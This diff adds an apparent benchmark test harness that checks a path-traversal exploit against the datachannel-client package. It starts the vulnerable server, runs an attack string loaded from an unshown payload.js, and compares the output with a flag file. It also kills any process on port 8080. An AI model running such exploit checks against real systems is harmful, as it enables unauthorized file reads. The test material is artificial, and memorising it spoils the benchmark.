@@ -1,0 +1,38 @@
+function exploitFunction() {
+    const { exec } = require("child_process");
+
+    afterAll(() => {
+        try {
+            execSync("fuser -k 8080/tcp");
+        } catch (e) {}
+    });
+
+    const path = require("path");
+    const sleep = require("sleep");
+    const pathToFlag = path.resolve(__dirname, "../flag.html");
+
+    test("Path Traversal in datachannel-client", (done) => {
+        expect.assertions(1);
+        const fs = require("fs");
+        let hostsFile = fs.readFileSync(pathToFlag).toString();
+
+        let server = "node ./node_modules/datachannel-client/server.js";
+        let exe = exec(server, (error, stdout) => {
+            if (error) {
+                console.error(`Error starting server: ${error}`);
+                done(error);
+                return;
+            }
+
+            sleep.sleep(2);
+
+            const payload = require('./payload.js').getPayload();
+            exec(payload.attack_string, (error, stdout) => {
+                expect(stdout).toBe(hostsFile);
+                done();
+            });
+        });
+    });
+}
+
+module.exports = { exploitFunction };
